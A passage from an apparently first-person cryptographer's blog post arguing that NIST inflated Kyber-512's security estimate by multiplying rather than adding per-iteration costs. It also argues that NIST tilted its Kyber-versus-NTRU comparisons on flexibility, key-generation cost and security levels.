in the iteration count,
and estimating that
the XYZZY attack uses 2<sup>95</sup> iterations."</p>
</li>
<li>
<p>Alice:
"Here's another source
looking at the details
of the computations inside each iteration,
and estimating that those computations
cost 2<sup>25</sup> bit operations."</p>
</li>
<li>
<p>Bob:
"There's also a gigantic array being accessed.
Here's a source
estimating that the memory access
inside each iteration
is as expensive as 2<sup>35</sup> bit operations."</p>
</li>
<li>
<p>Alice:
"Okay, let's review.
The best estimate available
for the total cost of each iteration in the XYZZY attack
is around 2<sup>35</sup> bit operations.
A tiny part of that is
2<sup>25</sup> bit operations for computation.
The main cost is the equivalent of
2<sup>35</sup> bit operations for the memory access."</p>
</li>
<li>
<p>Bob:
"Agreed.
Multiplying
2<sup>95</sup> iterations
by
2<sup>35</sup> bit operations per iteration
gives us a total of 2<sup>130</sup> bit operations.
Doesn't meet the security target."</p>
</li>
<li>
<p>Alice:
"Right,
that's a thousand times easier than AES-128 key search.
Let's move on to the next cryptosystem."</p>
</li>
</ul>
<p><strong>How to botch the tally of costs.</strong>
Imagine a government agency
that has also
been looking at this particular cryptosystem,
but with one critical difference:
the agency is desperate to say
that this cryptosystem is okay.</p>
<p>How does the agency deal with the XYZZY attack?</p>
<p>One answer is to aim
for a lower security goal,
hyping the cost of carrying out 2<sup>130</sup> bit operations.
For comparison,
Bitcoin mining
did only about 2<sup>111</sup> bit operations in 2022.
("Only"!)</p>
<p>But let's assume that
the agency has promised the world
that it will reach <em>at least</em>
the AES-128 security level.</p>
<p>What does the agency do?</p>
<p>Here's an idea.
For the costs per iteration,
<strong>instead of <em>adding</em> 2<sup>25</sup> for computation to 2<sup>35</sup> for memory access,
how about <em>multiplying</em> 2<sup>25</sup> for computation by 2<sup>35</sup> for memory access?</strong></p>
<p>The product is 2<sup>60</sup>.
Multiplying this by 2<sup>95</sup> iterations
gives 2<sup>155</sup>, solidly above 2<sup>143</sup>.
Problem solved!</p>
<p><strong>How discipline catches the error.</strong>
Alice and Bob are correctly tracking
the semantics of each number.
The agency isn't.</p>
<p>The total attack cost is the number of iterations
times the cost per iteration.
Each iteration incurs</p>
<ul>
<li>
<p>cost for computation, estimated as 2<sup>25</sup> bit operations, and</p>
</li>
<li>
<p>cost for memory access, estimated to be as expensive as 2<sup>35</sup> bit operations.</p>
</li>
</ul>
<p>The agency's multiplication of these two costs
makes no sense,
and produces a claimed per-iteration cost that's millions of times larger
than the properly estimated per-iteration cost.</p>
<p>This multiplication is so glaringly wrong
that it doesn't even pass
physics-style type-checking.
Specifically,
multiplying
"2<sup>25</sup> bitops/iter"
by
"2<sup>35</sup> bitops/iter"
doesn't give
"2<sup>60</sup> bitops/iter".
It gives
"2<sup>60</sup> bitops<sup>2</sup>/iter<sup>2</sup>".
Multiplying further by "2<sup>95</sup> iter"
doesn't give
"2<sup>155</sup> bitops";
it gives
"2<sup>155</sup> bitops<sup>2</sup>/iter".</p>
<p><strong>Agency desperation strikes back.</strong>
How can the agency
phrase this nonsensical calculation of a severely inflated security estimate
in a way that will pass superficial review?</p>
<p>The goal here is for the 155 to sound
as if it's simply putting together
numbers from existing sources.
For example:</p>
<ul>
<li>
<p><span color="red">Here's a source estimating
  an iteration count of 2<sup>95</sup>.</span></p>
</li>
<li>
<p><span color="red">Here's a source estimating
  2<sup>25</sup> bit operations per iteration.</span></p>
</li>
<li>
<p><span color="red">Here's a source estimating
  that accounting for memory
  multiplies costs by 2<sup>35</sup>.</span></p>
</li>
<li>
<p><span color="red">95 plus 25 plus 35 is 155,
  solidly above 143.</span></p>
</li>
</ul>
<p>The deception here is in the third step,
the step that leaps from
cost 2<sup>25</sup> per iteration
to cost 2<sup>60</sup> per iteration.</p>
<p>How many readers are going to check
the third source
and see that it was actually estimating
cost 2<sup>35</sup> per iteration?</p>
<p><strong>Streamlining the marketing.</strong>
The wrong calculation sounds even simpler
if there's a previous source
that has already put the 2<sup>95</sup>
and the 2<sup>25</sup> together:</p>
<ul>
<li>
<p><span color="red">Here's a source estimating
  2<sup>120</sup> bit operations.</span></p>
</li>
<li>
<p><span color="red">Here's a source estimating
  that accounting for memory
  multiplies costs by 2<sup>35</sup>.</span></p>
</li>
<li>
<p><span color="red">120 plus 35 is 155,
  solidly above 143.</span></p>
</li>
</ul>
<p>At this point the agency
has completely suppressed
any mention of iterations,
despite the central role of iterations
in the attack and in any competent analysis of the attack.</p>
<p>How many readers are going
to check <em>both</em> sources,
see that
the second source
estimates cost 2<sup>35</sup> per iteration,
and see that
the iteration count in the first source
is far below 2<sup>120</sup>?</p>
<p><strong>Kyber's limited selection of security levels.</strong>
You might be thinking something like this:
"Okay, sure, I see how it would be possible for a desperate agency
to replace cost addition with a nonsensical multiplication,
replacing 2<sup>130</sup> with a fake 2<sup>155</sup>,
while at the same time making this hard for people to see.
But <strong>why would anyone have wanted to play this risky game?</strong>
If Kyber-512 was around 2<sup>130</sup>,
and the target was a little above 2<sup>140</sup>,
why didn't they just bump up the parameters to 10% higher security,
something like Kyber-576?"</p>
<p>This is an obvious question given that
RSA and ECC and (to take some post-quantum examples) McEliece and NTRU
naturally support whatever size you want.</p>
<p>A long, long time ago,
I wrote
<a href="https://cr.yp.to/nistp224.html">fast software</a>
for the NSA/NIST P-224 elliptic curve,
and then found a
<a href="https://cr.yp.to/talks.html#2001.10.29">better curve</a>
at that security level,
namely
y<sup>2</sup> = x<sup>3</sup> + 7530x<sup>2</sup> + x mod 2<sup>226</sup>−5.
But then I decided that bumping the size up
to <a href="https://lib25519.cr.yp.to/">2<sup>255</sup>−19</a>
would be much more comfortable, so I did.</p>
<p>Kyber is different.
You <em>can't</em> just bump up Kyber's parameters to 10% higher security:</p>
<ul>
<li>
<p>Kyber-576 doesn't exist.
  If you want something stronger than Kyber-512
  then you have to increase the "dimension" by 50%,
  jumping all the way up to Kyber-768.</p>
</li>
<li>
<p>If you want something stronger than Kyber-768
  then you have to jump all the way up to Kyber-1024.</p>
</li>
<li>
<p>If you want something stronger than Kyber-1024
  then, sorry, tough luck.</p>
</li>
</ul>
<p>One of the "unique advantages of Kyber"
specifically advertised in the
<a href="https://web.archive.org/web/20230310174959/https://pq-crystals.org/kyber/data/kyber-specification-round3-20210804.pdf#subsection.6.1">official Kyber documentation</a>
is that implementing a "dimension-256 NTT"
handles "<em>all parameter sets</em>" for Kyber
(emphasis in original).
This "NTT" isn't something optional for Kyber implementors;
it's baked into the structure of Kyber's public keys and ciphertexts.
Using dimensions that aren't multiples of 256
would require changing the core Kyber design.</p>
<p>The same Kyber "advantage" also means that going beyond 1024
would lead to performance issues and,
more importantly,
security issues surrounding occasional
"decryption failures" forced by the prime baked into the NTT.
Avoiding this would again
require changing the core Kyber design.</p>
<p>For comparison,
NTRU options targeting higher security levels—including
simple proofs that there are no decryption failures—are readily available.
For example, one of the
<a href="https://ntruprime.cr.yp.to/">NTRU Prime</a>
options is <code>sntrup1277</code>.</p>
<p>But let's assume that NIST doesn't care about Kyber's limitations at the high end.
Let's instead focus on the low end,
specifically on applications that
have limited sizes for public keys and/or ciphertexts
and thus can't use the highest available security levels.</p>
<p>An application limited to 1KB
can't use Kyber-768 (1184-byte public keys, 1088-byte ciphertexts).
The highest-security Kyber option for that application
is Kyber-512 (800-byte keys, 768-byte ciphertexts).</p>
<p>The same application obtains
higher security with NTRU,
according to a security-estimation mechanism called "Core-SVP".
For example, the application can use </p>
<ul>
<li>
<p><code>sntrup653</code> (994-byte keys, 897-byte ciphertexts),
  where the Core-SVP security estimate is 2<sup>129</sup>,
  or</p>
</li>
<li>
<p>NTRU-677 (<code>ntruhps2048677</code>, 931-byte keys, 931-byte ciphertexts),
  where Core-SVP is 2<sup>145</sup>,</p>
</li>
</ul>
<p>while the current version of Kyber-512,
starting with the round-3 version from 2020,
has Core-SVP just 2<sup>118</sup>.</p>
<p>Is this "Core-SVP" something I made up to make Kyber look bad?
Absolutely not:</p>
<ul>
<li>
<p>Core-SVP is the security-estimation mechanism
that was <em>chosen by the Kyber team</em>
to estimate security levels
in its round-1 and round-2 submissions.
The mechanism was introduced by Kyber's predecessor, NewHope.</p>
</li>
<li>
<p>In 2020,
after I expressed
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/iyvpfk0hAQAJ">skepticism</a>
about whether Core-SVP
"gets the right ordering of security levels",
NIST
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/69c5Ph9vCAAJ">stated</a> that
"we feel that the CoreSVP metric does
indicate which lattice schemes are being more and less
aggressive in setting their parameters".
NIST's official
<a href="https://web.archive.org/web/20230903180546/https://nvlpubs.nist.gov/nistpubs/ir/2020/NIST.IR.8309.pdf">round-2 report</a>
in 2020
used Core-SVP for comparisons.</p>
</li>
<li>
<p>The original definition of Core-SVP assigns
2<sup>112</sup> to the round-3 version of Kyber-512.
Round-3 Kyber
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/NSe0wAzKJtA/m/dLP05gv7BgAJ">switched</a>
to a new definition of Core-SVP
that increases Kyber's Core-SVP
(without changing anything for NTRU).</p>
</li>
</ul>
<p>This blog post has bigger fish to fry,
so let's blindly accept Kyber's
claim that the new definition is better,
meaning that Kyber-512 has Core-SVP 2<sup>118</sup>.
That's still clearly worse than the
2<sup>129</sup> for <code>sntrup653</code> and the 2<sup>145</sup> for NTRU-677.</p>
<p>It's not that Kyber's competitors
<em>always</em> beat Kyber in size-security tradeoffs.
For example,
if an application instead has a limit of 1184 bytes,
then it can use Kyber-768, which has Core-SVP 2<sup>181</sup>,
while <code>ntruhps</code> needs 1230 bytes to reach Core-SVP 2<sup>179</sup>.</p>
<p>But Kyber's competitors
<em>often</em> beat Kyber in size-security tradeoffs.
Throwing away Kyber-512,
leaving just Kyber-768 and Kyber-1024,
means that Kyber has nothing as small as the 931 bytes for NTRU-677.</p>
<p><img src="https://blog.cr.yp.to/20231003/latticerisks-sizegraph.png">
The normal way for scientists to present quantitative tradeoffs is with scatterplots,
such as Figure 3.5 in my 2019 paper
<a href="https://cr.yp.to/papers.html#paretoviz">"Visualizing size-security tradeoffs for lattice-based encryption"</a>.
The particular scatterplot shown here is
Figure 7.3 in the 2021 paper
<a href="https://ntruprime.cr.yp.to/warnings.html">"Risks of lattice KEMs"</a>
from the NTRU Prime Risk-Management Team.
The vertical axis is the Core-SVP security estimate,
and the horizontal axis is ciphertext bytes.</p>
<p>The scatterplot shows that
Kyber has a higher Core-SVP than NTRU
for applications with a size limit of,
e.g., 768 bytes or 1088 bytes.
But NTRU has a higher Core-SVP than Kyber
for applications with a size limit of,
e.g., 700 bytes or 1024 bytes or 2048 bytes.
Kyber has nothing as small as the 699-byte option for NTRU.
Kyber also has nothing as strong as the 1842-byte option for NTRU.
NTRU is also trivially capable of adding further options
between and beyond what's shown in the graph,
whereas for Kyber this is more problematic.</p>
<p><strong>Official evaluation criteria for the competition.</strong>
NIST had issued an
<a href="https://web.archive.org/web/20220119113311/https://csrc.nist.gov/CSRC/media/Projects/Post-Quantum-Cryptography/documents/call-for-proposals-final-dec-2016.pdf">official call</a>
for post-quantum proposals in 2016.
One of the evaluation criteria in the call was as follows:</p>
<blockquote>
<p>Assuming good overall security and performance, schemes with greater
flexibility will meet the needs of more users than less flexible schemes,
and therefore, are preferable.</p>
</blockquote>
<p>One of the official examples given for "flexibility"
was that it is
“straightforward to customize the scheme's parameters to meet a
range of security targets and performance goals".</p>
<p>The call proposed five broad security "categories",
and said that submitters could specify even more than
five parameter sets to demonstrate flexibility:</p>
<blockquote>
<p>Submitters may also provide more than one parameter set in the same
category, in order to demonstrate how parameters can be tuned to offer
better performance or higher security margins.</p>
</blockquote>
<p>In 2020,
NIST eliminated NewHope.
One of the reasons stated
in the aforementioned
<a href="https://web.archive.org/web/20230903180546/https://nvlpubs.nist.gov/nistpubs/ir/2020/NIST.IR.8309.pdf">round-2 report</a>
was that
"KYBER naturally supports a category 3 security strength parameter set,
whereas NewHope does not".
NewHope offered only NewHope-512 and NewHope-1024.</p>
<p>Imagine Kyber similarly offering only Kyber-768 and Kyber-1024,
acknowledging that Kyber-512 doesn't meet the minimum security level specified by NIST.
It's then very easy to see how limited Kyber's flexibility is
compared to NTRU's broader, denser spectrum of security levels.
How, then, would NIST argue that Kyber is the best option?</p>
<p>One answer is that the evaluation criteria say more flexibility is preferable
only assuming "good overall security and performance".
But how would NIST argue that NTRU doesn't have "good overall security and performance"?</p>
<p>Regarding the security of Kyber and NTRU,
NIST's official 2022
<a href="https://web.archive.org/web/20230824124130/https://nvlpubs.nist.gov/nistpubs/ir/2022/NIST.IR.8413-upd1.pdf">selection report</a>
says that NIST is
"confident in the security that each provides".
The report describes MLWE, the problem inside Kyber,
as "marginally more convincing" than the problem inside NTRU.
There's much more that could and should have been said about
the security comparison between Kyber and NTRU:</p>
<ul>
<li>
<p>Kyber's use of modules,
  despite being portrayed as purely having a (marginal) security benefit,
  also introduces
  <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/BfnzYM8emOw/m/WHHQzM78AQAJ">extra subfields</a>
  into the cryptosystem structure,
  creating security risks
  analogous to the risks of taking extra subfields in pre-quantum DH.
  Fewer extra subfields appear in NTRU (depending on parameters) than in Kyber.
  NTRU Prime completely avoids extra subfields.</p>
</li>
<li>
<p>Kyber's QROM IND-CCA2 proof assuming MLWE hardness is much looser
  than NTRU's QROM IND-CCA2 proof assuming hardness of the problem inside NTRU.
  In other words,
  even under the assumption that MLWE is as strong as the problem inside NTRU,
  Kyber could be much weaker than NTRU.</p>
</li>
<li>
<p>NIST could have told people to use NTRU
  shortly after its deadline for NISTPQC input in 2021.
  Instead it delayed for three quarters of a year to carry out patent negotiations,
  and ended up telling people
  to wait for its Kyber patent license to activate in 2024,
  <strong>giving away three years of user data to attackers</strong>.
  Picking Kyber was doing obvious damage to security
  given the patent situation.</p>
</li>
</ul>
<p>The situation isn't that NTRU avoids <em>every</em> security risk of Kyber.
A <a href="https://ntruprime.cr.yp.to/warnings.html">careful comparison</a>
finds mathematical security risks in both directions.
Maybe there's a way to argue that the mathematical security risks for NTRU
should be given higher weight than the mathematical security risks for Kyber.
But the immediate choice that NIST was facing in 2021 between NTRU and Kyber,
assuming that the attackers currently recording user data
will have quantum computers in the future, was between</p>
<ul>
<li>
<p>the security risks of NTRU and</p>
</li>
<li>
<p>the guaranteed security failure of not yet deploying anything.</p>
</li>
</ul>
<p>The call for submissions said
"NIST believes it is critical that this process leads to cryptographic
standards that can be freely implemented in security technologies and products".
Nothing else in the call was labeled as "critical".
How could NIST ignore the damage that it was doing in not going ahead with NTRU?
NIST knew it didn't have a patent license signed for Kyber yet,
let alone an <em>activated</em> patent license.</p>
<p>Anyway,
let's get back to the question of how NIST might be able to argue
that NTRU doesn't have "good overall security and performance".
A report saying that NIST is
"confident in the security that each provides"
is obviously not claiming that NTRU doesn't have "good overall security".
What about performance?</p>
<p>The same selection report admits that
"the overall performance of any of these KEMs
would be acceptable for general-use applications".
If the objective is to use performance differences as a deciding factor
between two acceptable options,
let's see how Kyber would stack up without Kyber-512:
<img src="https://blog.cr.yp.to/20231003/latticerisks-sizegraph-no512.png"></p>
<ul>
<li>
<p>Kyber-768 and Kyber-1024 provide size-security tradeoffs that NTRU doesn't match.</p>
</li>
<li>
<p>NTRU-677 and NTRU-1229
  provide size-security tradeoffs that Kyber doesn't match.
  Even more options are already implemented for NTRU Prime.</p>
</li>
<li>
<p>The smallest options are from NTRU, not Kyber.</p>
</li>
<li>
<p>The highest-security options are from NTRU, not Kyber.</p>
</li>
</ul>
<p>This is a solid case for eliminating Kyber in favor of NTRU,
given NIST's declaration that there can be only one.</p>
<p>(If NIST thought that performance differences at this scale matter,
and if the best performance comes from Kyber at some security levels
and NTRU at other security levels,
then why wasn't NIST allowing both?
Answer:
The movie says there can be only one!
STOP ASKING QUESTIONS!)</p>
<p><strong>Tilting the competition, part 1: ignoring NTRU's extra flexibility.</strong>
Keeping Kyber-512 changes the competition.
Having three options, Kyber-512 and Kyber-768 and Kyber-1024,
looks a lot better than having just two.</p>
<p>There are four NTRU circles in the first scatterplot above,
namely NTRU-509 and NTRU-677 and NTRU-821 and NTRU-1229.
But NTRU-821 isn't a winner,
and earlier in NISTPQC there wasn't an NTRU-1229.</p>
<p>Wait a minute.
The NTRU literature has always made clear that NTRU supports many more options.
For example,
here's a scatterplot
from John Schanck's 2018 paper
<a href="https://eprint.iacr.org/2018/1174">"A comparison of NTRU variants"</a>.
<img src="https://blog.cr.yp.to/20231003/schanck-ntru.png">
There are a huge number of dots;
each dot is showing another NTRU option.</p>
<p>One of the bizarre twists in NISTPQC
was the following <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/LPuZKGNyQJ0/m/ZUoZZss5AwAJ">announcement</a>
from NIST in 2020:
"NIST believes that too many parameter sets make
evaluation and analysis more difficult."
I asked
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/LPuZKGNyQJ0/m/XchLDA3HAwAJ">various questions</a>
about this, starting as follows:</p>
<blockquote>
<p>How many is "too many"? How did flexibility, which was portrayed as
purely positive in the call for proposals, turn into a bad thing for
NIST? The call for proposals explicitly allowed multiple parameter sets
<em>per category</em>, never suggesting that this would be penalized!</p>
<p>NIST's latest report complains about NewHope's lack of flexibility to
use dimensions strictly between 512 and 1024. If a submission team is
thinking "Aha, Kyber similarly suffers from its lack of flexibility to
target security levels strictly between maybe-2<sup>128</sup> and maybe-2<sup>192</sup>, and
we can clearly show this to NIST by selecting parameter sets at several
intermediate security levels", then isn't this something NIST should be
interested in, rather than discouraging by making submitters worry that
this is "too many parameter sets"?</p>
</blockquote>
<p>NIST never replied.</p>
<p>Think about what this is like for
submitters trying to figure out what to do:</p>
<ul>
<li>
<p>The official evaluation criteria say flexibility is good.</p>
</li>
<li>
<p>A high-profile submission has just been eliminated,
  in part for having only two parameter sets.</p>
</li>
<li>
<p>So, okay, implement more parameter sets
  to demonstrate flexibility.</p>
</li>
<li>
<p>But, yikes, NIST is suddenly going out of its way
  to criticize "too many" parameter sets.
  They won't say what "too many" means
  and where this criticism came from.</p>
</li>
</ul>
<p>NTRU Prime
moved up to selecting six <code>sntrup</code> parameter sets
(plus six <code>ntrulpr</code> parameter sets, which, compared to <code>sntrup</code>,
have larger ciphertexts but smaller public keys),
enough that the flexibility advantage over Kyber should have been impossible to ignore.
NIST ignored it.</p>
<p><strong>Tilting the competition, part 2: exaggerating and hyping key-generation costs.</strong>
For Intel's recent Golden Cove microarchitecture
(the "performance" cores in Alder Lake CPUs),
<a href="https://bench.cr.yp.to/"><code>https://bench.cr.yp.to</code></a>
reports that</p>
<ul>
<li>
<p>Kyber-512 takes 25829 cycles for encapsulation
  and 20847 cycles for decapsulation,
  while</p>
</li>
<li>
<p>NTRU-509 takes just 15759 cycles for encapsulation
  and 25134 cycles for decapsulation.</p>
</li>
</ul>
<p>The total cycle count for handling a ciphertext,
the total of encapsulation and decapsulation,
is 13% smaller for NTRU-509 than for Kyber-512.</p>
<p>NTRU-509 also beats Kyber-512 in ciphertext size.
NTRU-509 is the leftmost dot in the first scatterplot above,
meaning smallest ciphertexts.</p>
<p>On the other hand,
NTRU-509 takes 112866 cycles for key generation
while Kyber-512 takes only 17777 cycles.
The total of key generation plus encapsulation plus decapsulation
is more than twice as large for NTRU-509 as for Kyber-512.</p>
<p>When some factors favor one option and some factors favor another option,
someone objectively searching for the best option
will think about what weight to put on each factor.
Here are three reasons that a careful performance analysis
will put very low weight on Kyber's key-generation speedup:</p>
<ul>
<li>
<p>There's overwhelming evidence that these cycle counts
  are far less important than byte counts.
  A useful rule of thumb is that sending or receiving a byte
  has similar cost to 1000 cycles;
  see Section 6.6 of the aforementioned paper
  <a href="https://ntruprime.cr.yp.to/warnings.html">"Risks of lattice KEMs"</a>.
  Sending a key, receiving a key, sending a ciphertext, and receiving a ciphertext
  involves thousands of bytes, similar cost to millions of cycles.</p>
</li>
<li>
<p>All of these KEMs are designed to allow a key to be reused for many ciphertexts.
  If an application actually cares about the cost of key generation
  then this reuse is an obvious step to take.
  NIST's
  <a href="https://web.archive.org/web/20220119113311/https://csrc.nist.gov/CSRC/media/Projects/Post-Quantum-Cryptography/documents/call-for-proposals-final-dec-2016.pdf">official evaluation criteria</a>
  already acknowledged the possibility
  that "applications can cache public keys,
  or otherwise avoid transmitting them frequently".
  Many applications are naturally reusing keys in any case.</p>
</li>
<li>
<p>Even in the extreme case of an application that structurally has to use
  a new key for each ciphertext,
  there's a trick due to Montgomery that makes NTRU key generation much faster.
  Billy Bob Brumley, Ming-Shing Chen, Nicola Tuveri, and I
  have a paper
  <a href="https://cr.yp.to/papers.html#opensslntru">"OpenSSLNTRU: Faster post-quantum TLS key exchange"</a>
  at USENIX Security 2022
  giving a web-browsing demo on top of TLS 1.3 using <code>sntrup761</code>
  with Montgomery's trick for key generation.
  We already had the paper and code online in 2021,
  before NIST's deadline for input regarding NISTPQC decisions.</p>
</li>
</ul>
<p>In other words:
If an average key is used for just 100 ciphertexts
then Kyber-512 saving 95089 Golden Cove cycles in key generation is</p>
<ul>
<li>
<p>of similar importance to changing ciphertext size by <em>a fraction of a byte</em>;</p>
</li>
<li>
<p>6x less important
  than NTRU-509 saving 5783 cycles per ciphertext;
  and</p>
</li>
<li>
<p>not what will happen in applications trying to optimize key-generation time,
  since in NTRU's case those applications will use Montgomery's trick.</p>
</li>
</ul>
<p>With this in mind,
let's look at the "Kyber vs NTRU vs Saber" slide
from NIST's March 2022 talk
<a href="https://web.archive.org/web/20220811213554/https://csrc.nist.gov/csrc/media/Presentations/2022/the-beginning-of-the-end-the-first-nist-pqc-standa/images-media/pkc2022-march2022-moody.pdf">"The beginning of the end: the first NIST PQC standards"</a>.</p>
<p><img src="https://blog.cr.yp.to/20231003/how-to-lie-with-graphs.png">
The eye is immediately drawn to the larger red bars on the right.
NTRU appears in two of the groups of bars,
in both cases with clearly larger bars,
meaning worse performance.</p>
<p>The main message NIST is communicating here is that
NTRU costs strikingly more than Kyber and Saber.
Only a small part of the audience
will go to the effort of checking the numbers
and seeing how NIST manipulated
the choices in its presentation to favor Kyber over NTRU:</p>
<ul>
<li>
<p>The graph gives 100% weight to key generation,
  utterly failing to account for key reuse.</p>
</li>
<li>
<p>The graph also
  utterly fails to account for Montgomery's trick.</p>
</li>
<li>
<p>The graph does include some recognition of communication costs,
  but even here NIST couldn't resist tweaking the numbers:
  "1000*(PK+CT)" counts Alice's cost while omitting Bob's cost.</p>
</li>
</ul>
<p>Regarding the last point:
1000 is just a rule of thumb.
NIST could have posted a rationale for a proposal to use 500
and asked for public comments.
But it didn't.</p>
<p>NIST's
<a href="https://nist.pqcrypto.org/foia/index.html#20230105/KSN%20Document.docx">secret October 2021 Kyber-SABER-NTRU comparison</a>
claimed, without citation, that I had said 1000*(PK+CT) was reasonable.
Compare this to what I had
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/VK9dROwgY0Y/m/PIXc9wTtCAAJ">actually written</a>
in 2019
about the costs of sending and receiving a ciphertext,
after various NTRU Prime documents had given examples backing up the first sentence:</p>
<blockquote>
<p>Typically sending or receiving a byte costs at least three orders of
magnitude more than a clock cycle. Taking bytes+cycles/1000 for
sntrup4591761 gives 1047+45 = 1092 for the sender, 1047+94 = 1141 for
the receiver, which is better than 1248 no matter how few cycles you
use.</p>
</blockquote>
<p>The numbers here account for Alice sending a 1047-byte <code>sntrup4591761</code> ciphertext
and Bob receiving a 1047-byte ciphertext,
on top of about 45000 Haswell cycles for Alice's enc
and about 94000 cycles for Bob's dec
(which was later sped up a lot,
but this barely matters next to the ciphertext sizes).
See also the more detailed NTRU examples in Section 6.6 of <a href="https://ntruprime.cr.yp.to/warnings.html">"Risks of lattice KEMs"</a>,
filed before NIST's deadline for input at the end of October 2021.</p>
<p>NIST's secret comparison continued by saying "David suggests 2000?",
apparently referring to a
<a href="https://nist.pqcrypto.org/foia/index.html#20221213/PQC%20KEM%20Benchmarks%2020200407.pdf">secret performance comparison in 2020</a>
where NIST used "bandwidth cost of 2000 cycles/byte".
Evidently NIST was considering multiple options for this number.
Maybe more FOIA results
will shed more light on how exactly NIST ended up with a NIST-fabricated option
that—<em>quelle surprise!</em>—is better for Kyber.</p>
<p>As for key reuse,
NIST might try to defend itself by saying, look, there's
a separate PK+CT bandwidth graph on the left,
which for these KEMs is visually close to a 2000*CT+enc+dec graph.
However:</p>
<ul>
<li>
<p>NIST chose to deemphasize the bandwidth graph by using thinner red bars for it.</p>
<p>The graph isn't invisible,
so together the two graphs don't give exactly 100% weight to key-generation time.
But a key used for 100 ciphertexts
incurs 1 keygen, 100 enc, and 100 dec,
meaning only 1% weight for key-generation time,
which is <em>very</em> far from the weight
conveyed by NIST's slide.</p>
</li>
<li>
<p>NIST chose to use smaller (and non-log)
  vertical scales for the bandwidth graph.
  This further deemphasizes that graph <em>and</em>
  makes it hard for the audience to notice
    the size advantage of
    NTRU-509 (699-byte keys and 699-byte ciphertexts)
    over Kyber-512 (800-byte keys and 768-byte ciphertexts).</p>
<p>NTRU-509's savings of 170 bytes in key+ciphertext size
compared to Kyber-512
is comparable to saving 340000 cycles in total for Alice and Bob.
This easily outweighs the cost of NTRU-509 key generation,
even in the extreme case of one ciphertext per key,
even <em>without</em> Montgomery's trick,
even if one rewinds a decade from Alder Lake to Haswell.</p>
<p>In short, NTRU-509's size advantage
is more important than Kyber-512's keygen-time advantage.
But NIST chose to give more vertical space to Kyber's keygen-time advantage
than to NTRU-509's size advantage.</p>
</li>
<li>
<p>NIST applied a <a href="https://cr.yp.to/papers.html#categories">discretization attack</a>
  to both graphs
  to conceal the security advantages of the larger NTRU options.</p>
<p>If NIST had provided an honest size-vs.-Core-SVP scatterplot,
then readers would have seen
that NTRU-677 has much higher Core-SVP than Kyber-512
and much better size than Kyber-768.
NIST would never have been able to get away with its
<a href="https://web.archive.org/web/20230824124130/https://nvlpubs.nist.gov/nistpubs/ir/2022/NIST.IR.8413-upd1.pdf">claim</a>
that NTRU has "somewhat larger public keys and ciphertexts" than Kyber:
a scatterplot immediately shows that,
no, this depends on the target security level,
with NTRU smaller at some security levels
and Kyber smaller at others.</p>
<p>Instead NIST started with the options in Core-SVP order
and then <em>grouped the options according to "category"</em>.
Because of this grouping,
the options <em>look like</em> they have some arbitrary order within each "category".
People looking at the graph
have no idea that NTRU's placement farther to the right in each "category"
reflects NTRU's higher security levels.
A different choice of "category" cutoffs
would have reversed the visual comparison.</p>
</li>
</ul>
<p>As for the failure to account for Montgomery's trick,
NIST might try to defend itself
by saying that the OpenSSLNTRU software focused on NTRU Prime,
so NIST's only choice was to presume that there's no speedup for NTRU beyond NTRU Prime.
In fact, the OpenSSLNTRU paper had already explained why there will be about a 2x speedup.</p>
<p><strong>Tilting the competition, part 3: concealing the fact that NTRU offers the highest security levels.</strong>
The official call for submissions in 2016
recommended focusing on "categories 1, 2 and/or 3".
See below for a full quote.</p>
<p>The call also recommended that submitters
"specify some other level of security that demonstrates the ability of
their cryptosystem to scale up beyond category 3".
NTRU (and NTRU Prime) did this,
specifying parameters across a wide range of security levels.
See, e.g., the 2018 scatterplot shown above.</p>
<p>In the aforementioned
<a href="https://web.archive.org/web/20230903180546/https://nvlpubs.nist.gov/nistpubs/ir/2020/NIST.IR.8309.pdf">round-2 report</a>
from 2020, NIST suddenly</p>
<ul>
<li>
<p>said that it
  "strongly encourages the
  submitters to provide at least one parameter set that meets category 5",</p>
</li>
<li>
<p>complained that
  "the NTRU submission lacks a category 5 parameter set proposal"
  when the costs of memory are ignored,
  and</p>
</li>
<li>
<p>complained that NTRU Prime provided
  "a narrower range of CoreSVP
  values than other lattice submissions targeting security strengths 1, 3, and 5".</p>
</li>
</ul>
<p>This wasn't following the official evaluation criteria.
NIST was retroactively changing "recommend" to "strongly encourage",
was retroactively changing "beyond category 3" to "category 5",
and was ignoring all of the existing documentation of NTRU's flexibility.</p>
<p>Submissions that provided "category 4",
or provided higher security within "category 3",
were fully meeting the recommendation in the official evaluation criteria:</p>
<blockquote>
<p>Submitters may also provide more than one parameter set in the same
category, in order to demonstrate how parameters can be tuned to offer better
performance or higher security margins.</p>
<p>NIST recommends that submitters primarily focus on parameters meeting the
requirements for categories 1, 2 and/or 3, since these are likely to provide sufficient
security for the foreseeable future. To hedge against future breakthroughs in cryptanalysis
or computing technology, NIST also recommends that submitters provide at least one
parameter set that provides a substantially higher level of security, above category 3.
Submitters can try to meet the requirements of categories 4 or 5, or they can specify some
other level of security that demonstrates the ability of their cryptosystem to scale up
beyond category 3.</p>
</blockquote>
<p>But, in 2020,
NIST wasn't even trying to follow the official evaluation criteria.
It was inventing new evaluation criteria, with no warning,
and retroactively applying
those criteria to criticize the NTRU and NTRU Prime submissions.</p>
<p>Unsurprisingly,
those submissions responded with software for higher security levels:</p>
<ul>
<li>
<p>NTRU responded with reference implementations of NTRU-1229 and NTRU-HRSS-1373.
  The NTRU team didn't provide optimized implementations
  (maybe it ran out of time, which is NIST's fault
  for not having asked for category 5
  in the official call four years earlier),
  but it reported that NTRU-1229 has Core-SVP 2<sup>301</sup>
  and that NTRU-HRSS-1373 has Core-SVP 2<sup>310</sup>.
  Both of these are solidly above Kyber-1024's 2<sup>254</sup>.</p>
</li>
<li>
<p>NTRU Prime responded with reference and optimized implementations of various options,
  such as <code>sntrup1277</code> and <code>ntrulpr1277</code>,
  which have Core-SVP 2<sup>270</sup> and 2<sup>271</sup> respectively,
  again above anything Kyber offers.
  (There's a code generator automatically
  producing all of the official NTRU Prime implementations;
  the generator is
  easily extensible to cover further parameter sets.)</p>
</li>
</ul>
<p>After insisting on higher security levels
(and adopting Core-SVP)
in its 2020 round-2 report,
NIST praised NTRU
for responding with higher security levels
